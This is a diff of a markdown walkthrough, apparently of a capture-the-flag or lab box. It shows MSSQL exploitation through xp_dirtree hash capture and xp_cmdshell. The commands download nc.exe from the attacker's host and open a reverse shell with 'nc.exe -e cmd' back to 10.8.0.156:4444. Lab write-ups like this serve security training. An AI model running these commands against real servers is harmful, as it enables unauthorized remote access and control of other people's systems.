@@ -318,11 +318,26 @@ Now let run `xp_dirtree "\\10.8.0.156\fakeshare"` on the target. Going back to `
 
 Now we have the same user hash not what am expecting damn let just try and get a shell from the `SQL` . So i locate an ncat binary on my machine if you are on kali it should be in `/usr/share/seclists/Web-Shells/FuzzDB/nc.exe` if you have `seclists` installed now back to the target let create a directory to transfer the ncat binary to.
 
+![image](https://user-images.githubusercontent.com/69868171/126156592-b454d44a-d894-411e-a629-67eb9b6ead87.png)
+
 ```
 EXEC xp_cmdshell 'mkdir C:\tmp'
+```
 
+We have our `SimpleHTTPServer` running already on port 80. Now back to the target again.
+
+```
 EXEC xp_cmdshell 'powershell -c curl http://10.8.0.156/nc.exe -o C:\tmp\nc.exe'
+```
+On our target let start a listener `nc -nvlp 4444` .
 
+Back to the target.
+
+```
 EXEC xp_cmdshell 'C:\tmp\nc.exe -e cmd 10.8.0.156 4444'
 ```
+
+![image](https://user-images.githubusercontent.com/69868171/126157319-d9310f03-7145-454b-9cd5-914d7c1c9aa1.png)
+
+Now let check our listener.
 
